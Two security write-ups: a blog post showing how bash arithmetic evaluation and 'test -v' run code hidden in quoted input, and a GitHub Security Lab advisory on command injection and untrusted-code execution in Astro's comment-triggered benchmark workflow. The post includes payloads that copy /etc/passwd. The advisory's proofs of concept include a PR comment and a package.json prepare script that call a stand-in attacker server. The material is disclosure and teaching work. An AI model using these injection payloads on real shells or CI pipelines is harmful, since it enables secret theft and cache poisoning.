##
#
https://yossarian.net/til/post/some-surprising-code-execution-sources-in-bash/
#
##


Some surprising code execution sources in bash
2024-11-15
security shell
I ran across two surprising sources of code execution in bash (and probably other shells) recently.

In a historic context these probably weren't too serious of a problem, but in the context of CI systems where everything is a rats' nest of shell and YAML they could be useful execution primitives.

Edit 2024-11-22: the Bash Pitfalls page in the Wooledge Bash Guide contains examples of these, among other sources of surprising evaluations.

Source 1: arithmetic expressions (a.k.a. "white-collar eval")
Leading question aside, do you think this snippet of bash1 can run arbitrary code?
```
function guess() {
  num="${1}"
  if [[ "${num}" -eq 42 ]]
  then
    echo "Correct"
  else
    echo "Wrong"
  fi
}
```
Most people (including experienced shell programmers2) say "no": they recognize that there could have been a splatting bug if it was $num instead of "${num}", but the double quoting should firmly prevent any evaluation of the num variable itself.

But nope: because of -eq, num is treated with bash's arithmetic evaluation rules, meaning that this works:
```
$ guess 'a[$(cat /etc/passwd > /tmp/pwned)] + 42'
Correct
$ cat /tmp/pwned
```
Note the single quotes: $(cat /etc/passwd > ~/pwned) is not executed eagerly as a parameter to guess, but as part of the evaluation of -eq within [[.

Unlike the case below, this doesn't appear to work with [ or test.

Source 2: test -v
The same surprising code execution source exists with test -v var, under the same conditions as arithmetic expressions (needs to use the builtin, not the standard binary):
```
$ [[ -v 'x[$(cat /etc/passwd > /tmp/pwned)]' ]]
$ cat /tmp/pwned
```
This also works with [ and test, so long as their builtin variants are used instead of their external binary variants. /usr/bin/[ and /usr/bin/test will of course not work, since they have no access to the context of the shell that spawned them.

I'm not 100% sure why this is the case, since -v var is documented as testing whether var is set and it shouldn't be necessary to evaluate a subscript to determine that.

Edit 2024-11-22: Multiple people have pointed out that -v var[...] checks for the subscript's presence, hence the "need" to evaluate expressions. This is not well documented anywhere, as far as I can tell.

Minimized and tweaked from Vidar Holen's blog, where I learned about this! ↩

I polled my coworkers: of 17 respondents, 16 through this snippet was fine and 1 thought it contained a potential vulnerability. ↩



##
#
https://securitylab.github.com/advisories/GHSL-2024-148_GHSL-2024-149_Astro/
#
##


Author avatar
Alvaro Munoz
Coordinated Disclosure Timeline
2024-07-05: Reported through Private Vulnerability Report.
2024-10-11: Fix commit.
Summary
Astro contains Actions workflows that are vulnerable to Code Injection and Execution of Untrusted Code which could be leverage to steal secrets and poison the cache.

Project
Astro

Tested Version
Latest commit at the time of reporting

Details
The benchmark.yml workflow is triggered on new comments (issue_comment) containing the magic word !bench. In order to trigger the workflow, the comment needs to be added to a pull request in the Astro org (github.repository_owner == 'withastro').

The permissions are set to contents: read but the workflow has access to the TURBO_TOKEN secret which seems to be a Vercel access token that could lead to cache poisoning and, transitively, to release poisoning.

It is not clear if the repo requires approval for new contributors or all contributors, but an attacker should be able to create a Pull Request and while it waits to be approved, a !bench xxx comment on it will trigger the vulnerable workflow.

Issue 1: Code Injection (GHSL-2024-148)
The comment body is processed and everything after !bench magic word is assigned to the benchcmd environment variable and later to the steps.bench-command.outputs.bench workflow variable. This variable contains untrusted command and is later interpolated into a Run shell script leading to shell injection:

      - name: Get bench command
        id: bench-command
        env:
          # protects from untrusted user input and command injection
          COMMENT: ${{ github.event.comment.body }}
        run: |
          benchcmd=$(echo "$COMMENT" | grep '!bench' | awk -F ' ' '{print $2}')
          echo "bench=$benchcmd" >> $GITHUB_OUTPUT
        shell: bash

      - name: Run benchmark
        id: benchmark-pr
        run: |
          result=$(pnpm run --silent benchmark ${{ steps.bench-command.outputs.bench }})
          processed=$(node ./benchmark/ci-helper.js "$result")
          echo "BENCH_RESULT<<BENCHEOF" >> $GITHUB_OUTPUT
          echo "### PR Benchmark" >> $GITHUB_OUTPUT
          echo "$processed" >> $GITHUB_OUTPUT
          echo "BENCHEOF" >> $GITHUB_OUTPUT
        shell: bash
PoC
Add the following comment to a PR:

!bench `curl https://attacker-server.com`
And check that the attacker server receives a connection from the workflow runner.

Impact
This issue may lead to the leakage of the TURBO_TOKEN secret and to GitHub Actions Cache Poisoning since an attacker may be able to steal the cache token and use it to poison the build dependencies used in other workflows.

Remediation
Make sure that the bench command only contains allowed characters
Issue 2: Execution of untrusted code (GHSL-2024-149)
The workflow checkouts untrusted code (PR head) in:

      - uses: actions/checkout@v4
        with:
          persist-credentials: false
          ref: refs/pull/${{ github.event.issue.number }}/head
And then run commands that may lead to execution of the untrusted code. Eg:

      - name: Install dependencies
        run: pnpm install
PoC
An attacker can send a Pull Request with a packages.json containing a script to be run when pnpm install is executed:

"scripts": {
    "prepare": "curl https://attacker-server.com",
},
Impact
This issue may lead to the leakage of the TURBO_TOKEN secret and to GitHub Actions Cache Poisoning since an attacker may be able to steal the cache token and use it to poison the build dependencies used in other workflows.

Resources
https://github.com/withastro/astro/security/advisories/GHSA-qm79-6wq7-m5wg
Credit
